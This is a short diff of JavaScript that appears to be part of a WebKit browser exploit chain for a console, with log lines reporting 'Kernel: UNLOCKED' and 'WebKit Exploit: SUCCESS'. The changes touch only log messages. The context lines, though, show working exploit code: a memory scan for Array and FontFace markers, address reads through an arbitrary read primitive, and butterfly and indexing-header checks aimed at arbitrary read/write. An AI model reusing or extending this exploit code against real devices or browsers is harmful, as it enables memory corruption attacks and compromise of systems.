@@ -811,13 +811,13 @@ async function init_arw() {
     for (let i = 0; i < dv.byteLength / 8; i += 8) {
       if (!found && dv.getBigUint64(i, true) === marker) {
         const marker = start + BigInt(i * 8);
-        logger.info(`Found Array marker at ${marker.hex()} !!!`);
+        logger.info(`Found Array marker at ${marker.hex()} !!`);
         const oob_arr_addr = rw.read8(marker + 0x20n);
         logger.debug(`oob_arr_addr: ${oob_arr_addr.hex()}`);
         const oob_arr_butterfly = rw.read8(oob_arr_addr + 8n);
         logger.debug(`oob_arr_butterfly: ${oob_arr_butterfly.hex()}`);
         oob_arr_indexing_header_addr = oob_arr_butterfly - 8n;
-        logger.debug(`oob_arr_indexing_header: ${oob_arr_indexing_header_addr.hex()}`);
+        logger.debug(`oob_arr_indexing_header_addr: ${oob_arr_indexing_header_addr.hex()}`);
         const oob_arr_indexing_header = rw.read8(oob_arr_indexing_header_addr);
         if (oob_arr_indexing_header.lo() !== 2n || oob_arr_indexing_header.htol() !== 3n) {
           continue;
@@ -827,7 +827,7 @@ async function init_arw() {
 
       if (!found_ffs && dv.getBigUint64(i, true) === marker_ffs) {
         const marker = start + BigInt(i * 8);
-        logger.info(`Found FontFace marker at ${marker.hex()} !!!`);
+        logger.info(`Found FontFace marker at ${marker.hex()} !!`);
         const js_font_addr = rw.read8(marker + 0x20n);
         logger.debug(`js_font_addr: ${js_font_addr.hex()}`);
         const font_addr = rw.read8(js_font_addr + 0x18n);
@@ -936,7 +936,7 @@ async function init_arw() {
   delete container.vector;
   delete container.length_and_flags;
 
-  logger.info("Achieved ARW !!!");
+  logger.info("Achieved ARW !!");
 }
 
 function init_aslr() {
@@ -1168,7 +1168,7 @@ export async function main() {
       logger.info("  Debug Settings: ENABLED");
       logger.info("  Kernel: UNLOCKED");
       logger.info("=========================================");
-      logger.info("  P54 | firmware: ${version.toString()}");
+      logger.info(`  P54 | firmware: ${version.toString()}`);
       logger.info("  WebKit Exploit: SUCCESS");
     }
 
